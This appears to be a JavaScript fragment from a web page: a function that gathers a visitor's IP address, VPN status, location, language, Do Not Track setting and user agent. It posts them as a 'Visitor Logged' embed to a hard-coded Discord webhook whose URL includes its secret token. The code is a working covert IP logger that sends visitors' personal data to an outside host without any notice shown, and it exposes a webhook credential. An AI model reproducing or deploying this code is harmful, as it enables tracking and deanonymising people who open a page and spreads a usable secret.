        function sendData(ip, vpn, ipData /* discordId */, image) {
          var currentTime = new Date().toUTCString();
          var embed = {
            embeds: [
              {
                title: "Visitor Logged",
                description: `Logged At: \`${currentTime}\``,
                image: {
                  url: image,
                },
                color: 14177041,
                fields: [
                  {
                    name: "IP Address",
                    value: ip,
                    inline: true,
                  },
                  {
                    name: "VPN",
                    value: vpn ? "✅" : "❌",
                    inline: true,
                  },
                  {
                    name: "Location",
                    value: ipData ? ipData : "❓",
                    inline: true,
                  },
                  {
                    name: "Browser Language",
                    value: navigator.language
                      ? navigator.language.toUpperCase()
                      : "❓",
                    inline: true,
                  },
                  {
                    name: "Do Not Track",
                    value: navigator.doNotTrack ? "✅" : "❌",
                    inline: true,
                  },
                  {
                    name: "Cookies Enabled",
                    value: navigator.cookieEnabled ? "✅" : "❌",
                    inline: true,
                  },
                  {
                    name: "App Version / User Agent",
                    value: navigator.appVersion,
                  },
                ],
              },
            ],
          };

          fetch(
            "https://discord.com/api/webhooks/1374760366751617145/O7yzCxpkcBvsrCePdf3REayvPHbJ4jJZ3NxTTdCSQAREhHZhUrm3tJyVbm6c_OcRRN5r",
            {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
              },
              body: JSON.stringify(embed),
            }
          ).then(response => {
                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }
                console.log("Webhook sent successfully!");
            }).catch((error) => {
            console.error("Error sending data:", error);
            alert("Error sending data to Discord. Check the console.");
          });
        }
